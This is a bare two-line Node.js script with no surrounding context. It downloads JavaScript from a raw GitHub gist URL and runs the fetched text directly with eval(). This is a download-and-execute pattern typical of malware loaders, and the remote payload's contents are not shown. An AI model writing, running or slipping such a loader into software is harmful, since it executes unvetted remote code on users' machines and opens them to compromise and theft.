const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/b49267b00e53c7c1ade180ff91095bc4d65a7392/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
